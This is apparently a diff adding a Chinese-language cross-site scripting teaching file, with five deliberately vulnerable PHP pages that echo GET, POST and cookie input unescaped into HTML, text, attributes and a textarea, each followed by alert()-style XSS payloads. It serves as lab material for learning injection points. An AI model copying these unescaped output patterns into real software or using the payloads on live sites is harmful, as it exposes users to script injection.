@@ -1,0 +1,180 @@
+code-1:GET直接输出
+-----------------------------------------------------------------------------
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /> 
+<title>XSS原理重现</title>
+</head>
+<body>
+<form action="" method="get">
+<input type="text" name="xss_input">
+<input type="submit">
+</form>
+<hr>
+<?php
+$xss = $_GET['xss_input'];
+echo '你输入的字符为<br>'.$xss;
+?>
+</body>
+</html>
+-----------------------------------------------------------------------------
+payload http://www.xxx.com/?xss_input=<script>alert(1)</script>
+
+
+
+
+code-2:属性位点
+-----------------------------------------------------------------------------
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /> 
+<title>XSS利用输出的环境来构造代码</title>
+</head>
+<body>
+<center>
+<h6>把我们输入的字符串 输出到input里的value属性里</h6>
+<form action="" method="get">
+<h6>请输入你想显现的字符串</h6>
+<input type="text" name="xss_input_value" value="输入"><br>
+<input type="submit">
+</form>
+<hr>
+<?php
+$xss = $_GET['xss_input_value'];
+if(isset($xss)){
+echo '<input type="text" value="'.$xss.'">';
+}else{
+echo '<input type="type" value="输出">';
+}
+?>
+</center>
+</body>
+</html>
+-----------------------------------------------------------------------------
+payload: http://www.xxx.com/?xss_input="><script>alert("xss")</script>
+payload: http://www.xxx.com/?xss_input=" onmousemove="alert('xss')"
+
+
+
+
+code-3:标签内部
+-----------------------------------------------------------------------------
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /> 
+<title>TEXTAREA元素内容测试页</title>
+</head>
+<body>
+<form action="" method="get">
+请输入你想显现的字符串
+<input type="text" name="xss_input_value" value="输入"><br>
+<input type="submit">
+</form>
+<hr>
+你提交的查询是：<br>
+<?php
+$xss = $_GET['xss_input_value'];
+if(isset($xss)){
+echo '<textarea type="text">'.$xss.'</textarea>';
+}else{
+echo '<textarea type="type">你还没提交任何内容</textarea>';
+}
+?>
+</center>
+</body>
+</html>
+-----------------------------------------------------------------------------
+payload: http://www.xxx.com/?xss_input=</textarea><script>alert("xss")</script>
+payload: http://www.xxx.com/?xss_input=</textarea><img src="http://www.baidu.com" onerror="alert('xss')">
+
+
+
+
+code-4:POST位点
+-----------------------------------------------------------------------------
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /> 
+<title>POST-XSS测试页面</title>
+</head>
+<body>
+<form action="" method="POST">
+请选择你喜爱的水果
+<select name="fruit">
+  <option value="apple">苹果</option>
+  <option value="banana">香蕉</option>
+  <option value="orange">橘子</option>
+  <option value="lemon">柠檬</option>
+  <option value="pear">梨子</option>
+
+</select>
+<input type="submit" value="提交">
+</form>
+<hr>
+
+<?php
+$xss = $_POST['fruit'];
+if(isset($xss)){
+echo '<input type="text" style="border:none" size="30" value="你选择的水果是：'.$xss.'">';
+}else{
+echo '<input type="text" style="border:none" size="30" value="您目前还没有选择">';
+}
+?>
+</center>
+</body>
+</html>
+-----------------------------------------------------------------------------
+用hackbar或者 tamperdata抓包改POST提交值如下
+fruit="><script>alert(1)</script>
+
+
+
+
+
+
+code-5:COOKIE位点
+-----------------------------------------------------------------------------
+<?php
+  setcookie("user","guest",time()+3600);
+?>
+
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /> 
+<title>COOKIE-XSS测试页面</title>
+</head>
+<body>
+<hr>
+当前访问身份是：
+<?php
+if(isset($_COOKIE["user"]))$xss=$_COOKIE["user"];
+if(isset($xss)){
+echo '<p style="color:red">'.$xss.'</p>';
+}else{
+echo '<p style="color:red">你的COOKIE还没创建</p>';
+}        
+?>        
+</center>
+</body> 
+</html>
+-----------------------------------------------------------------------------
+使用firebug直接修改cookie值
+user=<script>alert(1)</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
